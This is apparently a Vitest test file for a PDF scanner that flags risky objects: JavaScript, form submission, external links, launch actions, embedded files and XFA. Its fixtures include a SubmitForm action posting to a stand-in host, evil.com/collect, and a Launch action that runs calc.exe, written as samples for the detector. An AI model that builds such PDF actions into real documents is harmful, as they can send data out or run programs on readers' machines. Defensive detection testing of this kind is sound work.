import { describe, it, expect } from 'vitest';
import { getDetectedObjectsWithHex } from '../../src/detection/pdf-objects';

describe('Enhanced Detection Patterns', () => {
  // Helper to create test PDF content with specific patterns
  function createTestPDF(content: string): ArrayBuffer {
    const pdfContent = `%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
${content}
>>
endobj

2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj

3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
>>
endobj

xref
0 4
0000000000 65535 f 
0000000010 00000 n 
0000000074 00000 n 
0000000123 00000 n 
trailer
<<
/Size 4
/Root 1 0 R
>>
startxref
184
%%EOF`;
    
    return new TextEncoder().encode(pdfContent).buffer;
  }

  describe('JavaScript Threats', () => {
    it('should detect JavaScript actions (/JavaScript)', () => {
      const pdf = createTestPDF('/S /JavaScript\n/JS (app.alert("test");)');
      const detected = getDetectedObjectsWithHex(pdf);
      
      expect(detected.some(obj => obj.name === 'JavaScript actions (/JavaScript)')).toBe(true);
    });

    it('should detect JavaScript objects (/JS)', () => {
      const pdf = createTestPDF('/JS (this.print();)');
      const detected = getDetectedObjectsWithHex(pdf);
      
      expect(detected.some(obj => obj.name === 'JavaScript objects (/JS)')).toBe(true);
    });

    it('should detect both JavaScript patterns independently', () => {
      const pdf = createTestPDF('/S /JavaScript\n/JS (app.alert("test");)');
      const detected = getDetectedObjectsWithHex(pdf);
      
      const jsActions = detected.filter(obj => obj.name === 'JavaScript actions (/JavaScript)');
      const jsObjects = detected.filter(obj => obj.name === 'JavaScript objects (/JS)');
      
      expect(jsActions).toHaveLength(1);
      expect(jsObjects).toHaveLength(1);
    });
  });

  describe('Navigation & Actions', () => {
    it('should detect form submission actions (/SubmitForm)', () => {
      const pdf = createTestPDF('/S /SubmitForm\n/F (http://evil.com/collect)');
      const detected = getDetectedObjectsWithHex(pdf);
      
      expect(detected.some(obj => obj.name === 'Form submission actions (/SubmitForm)')).toBe(true);
    });

    it('should detect external links (/URI)', () => {
      const pdf = createTestPDF('/S /URI\n/URI (http://malicious.com)');
      const detected = getDetectedObjectsWithHex(pdf);
      
      expect(detected.some(obj => obj.name === 'External links (/URI)')).toBe(true);
    });

    it('should detect GoTo actions (/GoTo)', () => {
      const pdf = createTestPDF('/S /GoTo\n/D [3 0 R /XYZ 0 0 0]');
      const detected = getDetectedObjectsWithHex(pdf);
      
      expect(detected.some(obj => obj.name === 'GoTo actions (/GoTo)')).toBe(true);
    });

    it('should detect launch actions (/Launch)', () => {
      const pdf = createTestPDF('/S /Launch\n/F (calc.exe)');
      const detected = getDetectedObjectsWithHex(pdf);
      
      expect(detected.some(obj => obj.name === 'Launch actions (/Launch)')).toBe(true);
    });

    it('should detect named actions (/Named)', () => {
      const pdf = createTestPDF('/S /Named\n/N /Print');
      const detected = getDetectedObjectsWithHex(pdf);
      
      expect(detected.some(obj => obj.name === 'Named actions (/Named)')).toBe(true);
    });
  });

  describe('File & Media Embedding', () => {
    it('should detect embedded files (/EmbeddedFile)', () => {
      const pdf = createTestPDF('/Type /EmbeddedFile\n/Length 1024');
      const detected = getDetectedObjectsWithHex(pdf);
      
      expect(detected.some(obj => obj.name === 'Embedded files (/EmbeddedFile)')).toBe(true);
    });

    it('should detect file specifications (/Filespec)', () => {
      const pdf = createTestPDF('/Type /Filespec\n/F (malware.exe)');
      const detected = getDetectedObjectsWithHex(pdf);
      
      expect(detected.some(obj => obj.name === 'File specifications (/Filespec)')).toBe(true);
    });

    it('should detect rich media (/RichMedia)', () => {
      const pdf = createTestPDF('/Type /RichMedia\n/Content << /Type /Flash >>');
      const detected = getDetectedObjectsWithHex(pdf);
      
      expect(detected.some(obj => obj.name === 'Rich media (/RichMedia)')).toBe(true);
    });

    it('should detect sound objects (/Sound)', () => {
      const pdf = createTestPDF('/Type /Sound\n/R 22050');
      const detected = getDetectedObjectsWithHex(pdf);
      
      expect(detected.some(obj => obj.name === 'Sound objects (/Sound)')).toBe(true);
    });

    it('should detect movie objects (/Movie)', () => {
      const pdf = createTestPDF('/Type /Movie\n/F (video.mp4)');
      const detected = getDetectedObjectsWithHex(pdf);
      
      expect(detected.some(obj => obj.name === 'Movie objects (/Movie)')).toBe(true);
    });
  });

  describe('Interactive Elements', () => {
    it('should detect additional actions (/AA)', () => {
      const pdf = createTestPDF('/AA << /O 4 0 R >>');
      const detected = getDetectedObjectsWithHex(pdf);
      
      expect(detected.some(obj => obj.name === 'Additional actions (/AA)')).toBe(true);
    });

    it('should detect action objects (/A)', () => {
      const pdf = createTestPDF('/A << /S /JavaScript >>');
      const detected = getDetectedObjectsWithHex(pdf);
      
      expect(detected.some(obj => obj.name === 'Action objects (/A)')).toBe(true);
    });

    it('should detect XFA forms (/XFA)', () => {
      const pdf = createTestPDF('/XFA [4 0 R 5 0 R]');
      const detected = getDetectedObjectsWithHex(pdf);
      
      expect(detected.some(obj => obj.name === 'XFA forms (/XFA)')).toBe(true);
    });
  });

  describe('Signatures & Fonts', () => {
    it('should detect digital signatures (/Sig)', () => {
      const pdf = createTestPDF('/Type /Sig\n/Filter /Adobe.PPKLite');
      const detected = getDetectedObjectsWithHex(pdf);
      
      expect(detected.some(obj => obj.name === 'Digital signatures (/Sig)')).toBe(true);
    });

    it('should detect signature fields (/ByteRange)', () => {
      const pdf = createTestPDF('/ByteRange [0 1234 5678 90]');
      const detected = getDetectedObjectsWithHex(pdf);
      
      expect(detected.some(obj => obj.name === 'Signature fields (/ByteRange)')).toBe(true);
    });

    it('should detect Type1 fonts (/Type1)', () => {
      const pdf = createTestPDF('/Subtype /Type1\n/BaseFont /Helvetica');
      const detected = getDetectedObjectsWithHex(pdf);
      
      expect(detected.some(obj => obj.name === 'Type1 fonts (/Type1)')).toBe(true);
    });

    it('should detect CFF fonts (/CFF)', () => {
      const pdf = createTestPDF('/Subtype /CFF\n/FontFile3 4 0 R');
      const detected = getDetectedObjectsWithHex(pdf);
      
      expect(detected.some(obj => obj.name === 'CFF fonts (/CFF)')).toBe(true);
    });

    it('should detect TrueType fonts (/TrueType)', () => {
      const pdf = createTestPDF('/Subtype /TrueType\n/FontFile2 4 0 R');
      const detected = getDetectedObjectsWithHex(pdf);
      
      expect(detected.some(obj => obj.name === 'TrueType fonts (/TrueType)')).toBe(true);
    });
  });

  describe('Multiple Pattern Detection', () => {
    it('should detect multiple different patterns in the same PDF', () => {
      const pdf = createTestPDF(`
/S /JavaScript
/JS (app.alert("test");)
/SubmitForm << /F (http://evil.com) >>
/URI (http://malicious.com)
/Type /EmbeddedFile
/XFA [4 0 R]
`);
      const detected = getDetectedObjectsWithHex(pdf);
      
      expect(detected.length).toBeGreaterThanOrEqual(6);
      expect(detected.some(obj => obj.name.includes('JavaScript actions'))).toBe(true);
      expect(detected.some(obj => obj.name.includes('JavaScript objects'))).toBe(true);
      expect(detected.some(obj => obj.name.includes('Form submission'))).toBe(true);
      expect(detected.some(obj => obj.name.includes('External links'))).toBe(true);
      expect(detected.some(obj => obj.name.includes('Embedded files'))).toBe(true);
      expect(detected.some(obj => obj.name.includes('XFA forms'))).toBe(true);
    });

    it('should provide hex snippets for all detected patterns', () => {
      const pdf = createTestPDF('/S /JavaScript\n/URI (http://test.com)');
      const detected = getDetectedObjectsWithHex(pdf);
      
      detected.forEach(detection => {
        expect(detection.hexSnippet).toBeDefined();
        expect(detection.hexSnippet.length).toBeGreaterThan(0);
        expect(detection.hexSnippet).toContain('MATCH_OFFSET:');
        expect(detection.hexSnippet).toContain('CHUNK_SIZE:');
      });
    });
  });

  describe('Edge Cases', () => {
    it('should handle empty PDF content', () => {
      const pdf = createTestPDF('');
      const detected = getDetectedObjectsWithHex(pdf);
      
      expect(detected).toHaveLength(0);
    });

    it('should handle PDF with no dynamic objects', () => {
      const pdf = createTestPDF('/Title (Safe Document)\n/Author (Test)');
      const detected = getDetectedObjectsWithHex(pdf);
      
      expect(detected).toHaveLength(0);
    });

    it('should not detect false positives', () => {
      const pdf = createTestPDF(`
/Title (This document mentions JavaScript but doesn't contain it)
/Subject (URI: http://example.com)
/Keywords (embedded files, XFA, signatures)
`);
      const detected = getDetectedObjectsWithHex(pdf);
      
      // Should not detect patterns in metadata strings
      expect(detected).toHaveLength(0);
    });
  });
});
